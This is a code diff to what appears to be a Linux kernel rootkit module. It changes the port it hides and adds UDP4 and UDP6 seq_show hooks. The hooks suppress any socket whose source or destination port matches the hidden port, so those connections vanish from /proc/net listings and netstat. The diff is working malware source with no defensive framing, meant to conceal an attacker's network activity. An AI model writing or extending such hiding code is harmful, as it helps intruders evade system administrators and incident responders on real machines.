@@ -11,7 +11,7 @@
 typedef unsigned short port_t;
 
 //TODO add list with [PROTO:PORT] structs
-static port_t to_hide = 46333;
+static port_t to_hide = 15892;
 
 static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
 static int (*udp4_seq_show)(struct seq_file *seq, void *v);
@@ -94,7 +94,7 @@ g7_tcp4_seq_show(struct seq_file *seq, void *v)
     return tcp4_seq_show(seq, v);
 }
 
-//This is basically the same as above
+//This following hooks are basically the same as above
 static int
 g7_tcp6_seq_show(struct seq_file *seq, void *v)
 {
@@ -116,11 +116,35 @@ g7_tcp6_seq_show(struct seq_file *seq, void *v)
 static int
 g7_udp4_seq_show(struct seq_file *seq, void *v)
 {
+    if(v == SEQ_START_TOKEN)
+        return udp4_seq_show(seq, v);
+
+    struct sock *sk = v;
+    const struct inet_sock *inet = inet_sk(sk);
+
+    port_t src = ntohs(inet->inet_sport);
+    port_t dst = ntohs(inet->inet_dport);
+
+    if(src == to_hide || dst == to_hide)
+        return 0;
+    
     return udp4_seq_show(seq, v);
 }
 
 static int
 g7_udp6_seq_show(struct seq_file *seq, void *v)
 {
+    if(v == SEQ_START_TOKEN)
+        return udp6_seq_show(seq, v);
+
+    struct sock *sk = v;
+    const struct inet_sock *inet = inet_sk(sk);
+
+    port_t src = ntohs(inet->inet_sport);
+    port_t dst = ntohs(inet->inet_dport);
+
+    if(src == to_hide || dst == to_hide)
+        return 0;
+    
     return udp6_seq_show(seq, v);
 }
